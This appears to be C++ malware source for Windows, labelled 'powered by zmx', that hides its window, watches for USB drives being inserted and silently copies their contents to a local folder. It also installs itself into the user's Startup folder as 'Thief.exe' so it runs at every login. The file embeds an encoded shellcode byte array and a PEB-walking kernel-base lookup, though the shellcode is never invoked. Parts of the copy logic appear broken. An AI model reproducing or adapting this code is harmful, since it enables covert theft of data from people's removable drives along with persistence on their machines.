#include <bits/stdc++.h>
#include <windows.h>
#include <stdio.h>
#include <dbt.h>
#include <shlwapi.h>
#include <cstring>
#pragma comment(lib, "shlwapi.lib")
#include <windows.h>
#include <windows.h>
#include <string>
#include <shlobj.h> // 用于SHBrowseForFolder
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")
#define IDR_PAUSE 1001
#define IDR_START 1002
#define IDR_CHANGE_DIR 1003
#define IDR_SHOW_DIR 1004


//
// powered by zmx
// 

unsigned char buf[] = "\xb8\xac\xcb\x44\x44\x44\x24\x75\x96\xcd\xa1\x20\xcf\x16\x74\xcf\x16\x48\xcf\x16\x50\x75\xbb\x4b\xf3\xe\x62\xcf\x36\x6c\x75\x84\xe8\x78\x25\x38\x46\x68\x64\x85\x8b\x49\x45\x83\xd\x31\xab\x16\xcf\x16\x54\x13\xcf\x6\x78\x45\x94\xcf\x4\x3c\xc1\x84\x30\x8\x45\x94\xcf\x1c\x64\x45\x97\xcf\xc\x5c\x14\xc1\x8d\x30\x78\x75\xbb\xd\xcf\x70\xcf\x45\x92\x75\x84\x85\x8b\x49\xe8\x45\x83\x7c\xa4\x31\xb0\x47\x39\xbc\x7f\x39\x60\x31\xa4\x1c\xcf\x1c\x60\x45\x97\x22\xcf\x48\xf\xcf\x1c\x58\x45\x97\xcf\x40\xcf\x45\x94\xcd\x0\x60\x60\x1f\x1f\x25\x1d\x1e\x15\xbb\xa4\x1c\x1b\x1e\xcf\x56\xad\xc4\xbb\xbb\xbb\x19\x2c\x77\x76\x44\x44\x2c\x33\x37\x76\x1b\x10\x2c\x8\x33\x62\x43\xcd\xac\xbb\x94\xfc\xd4\x45\x44\x44\x6d\x80\x10\x14\x2c\x6d\xc4\x2f\x44\xbb\x91\x2e\x4e\x2c\x84\xec\xdd\xc5\x2c\x46\x44\x55\x18\xcd\xa2\x14\x14\x14\x14\x4\x14\x4\x14\x2c\xae\x4b\x9b\xa4\xbb\x91\xd3\x2e\x54\x12\x13\x2c\xdd\xe1\x30\x25\xbb\x91\xc1\x84\x30\x4e\xbb\xa\x4c\x31\xa8\xac\x23\x44\x44\x44\x2e\x44\x2e\x40\x12\x13\x2c\x46\x9d\x8c\x1b\xbb\x91\xc7\xbc\x44\x3a\x72\xcf\x72\x2e\x4\x2c\x44\x54\x44\x44\x12\x2e\x44\x2c\x1c\xe0\x17\xa1\xbb\x91\xd7\x17\x2e\x44\x12\x17\x13\x2c\x46\x9d\x8c\x1b\xbb\x91\xc7\xbc\x44\x39\x6c\x1c\x2c\x44\x4\x44\x44\x2e\x44\x14\x2c\x4f\x6b\x4b\x74\xbb\x91\x13\x2c\x31\x2a\x9\x25\xbb\x91\x1a\x1a\xbb\x48\x60\x4b\xc1\x34\xbb\xbb\xbb\xad\xdf\xbb\xbb\xbb\x45\x87\x6d\x82\x31\x85\x87\xff\xb4\xf1\xe6\x12\x2e\x44\x17\xbb\x91";

size_t getKernelBase()
{
	return *(***(*((size_t*****)__readfsdword(0x30) + 3) + 7) + 2);
}
std::string targetBasePath = "D:\\Public_USB";

void CopyFilesFromUSB(const std::string& sourcePath, const std::string& targetPath) {

    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA((sourcePath + "\\*").c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return; // 不输出错误信息
    }

    do {
        // 跳过 "." 和 ".." 目录
        if (strcmp(findFileData.cFileName, ".") == 0 || strcmp(findFileData.cFileName, "..") == 0) {
            continue;
        }

        std::string sourceFilePath = sourcePath + "\\" + findFileData.cFileName;
        std::string targetFilePath = targetPath + "\\" + findFileData.cFileName;

        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // 创建目标文件夹
            if (!CreateDirectoryA(targetFilePath.c_str(), NULL)) {
                if (GetLastError() != ERROR_ALREADY_EXISTS) {
                    continue;
                }
            }
            CopyFilesFromUSB(sourceFilePath, targetFilePath);
            CopyFileA(sourceFilePath.c_str(), targetFilePath.c_str(), TRUE);
        }
    } while (FindNextFileA(hFind, &findFileData) != 0);

    FindClose(hFind);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
        
    case WM_DEVICECHANGE: // 设备变化消息
        if (wParam == DBT_DEVICEARRIVAL) {
            // 设备插入事件
            PDEV_BROADCAST_HDR pHdr = (PDEV_BROADCAST_HDR)lParam;
            if (pHdr->dbch_devicetype == DBT_DEVTYP_VOLUME) {
                for (int i = 0; i < 26; i++) {
                    char driveLetter = 'A' + i;
                    std::string drivePath = std::string(1, driveLetter) + ":\\";

                    // 判断驱动器类型
                    UINT driveType = GetDriveTypeA(drivePath.c_str());

                    if (driveType == DRIVE_CDROM || (driveType == DRIVE_REMOVABLE && (driveLetter == 'A' || driveLetter == 'B'))) {
                        continue; // 跳过软盘和光盘
                    }
                    // 如果是可移动磁盘（U 盘）
                    if (driveType == DRIVE_REMOVABLE) {
                        // 获取 U 盘名称（卷标）
                        char volumeName[MAX_PATH + 1] = { 0 };
                        if (!GetVolumeInformationA(drivePath.c_str(), volumeName, MAX_PATH, NULL, NULL, NULL, NULL, 0)) {
                            strncpy(volumeName, "USB_Drive", MAX_PATH);
                            volumeName[MAX_PATH - 1] = '\0';
                        }

                        // 构造目标文件夹路径
                        std::string targetPath = targetBasePath + "\\" + std::string(volumeName);

                        // 创建目标文件夹
                        if (!CreateDirectoryA(targetPath.c_str(), NULL)) {
                            if (GetLastError() != ERROR_ALREADY_EXISTS) {
                                continue;
                            }
                        }

                        // 拷贝 U 盘中的所有文件
                        CopyFilesFromUSB(drivePath, targetPath);
                    }
                }
            }
        }
        break;
	}
}

void HKRunator(char *programName) // 程序名称（**全路径**）
{
	char* username;
    char destinationPath[MAX_PATH];
	username = getenv("USERPROFILE");
	snprintf(destinationPath, sizeof(destinationPath), "%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Thief.exe", username);
	CopyFileA(programName, destinationPath, FALSE);
}

int main() 
{
	char szSelfName[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, szSelfName, MAX_PATH);
    HKRunator(szSelfName);
    HINSTANCE hInstance = GetModuleHandle(NULL);
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "USBDetect";
    if (!RegisterClass(&wc)) {
        return 1;
    }
    HWND hWnd = CreateWindow("USBDetect", "USBDetect", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 
                             CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, hInstance, NULL);
    if (!hWnd) {
        return 1;
    }
    ShowWindow(hWnd, SW_HIDE); 
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
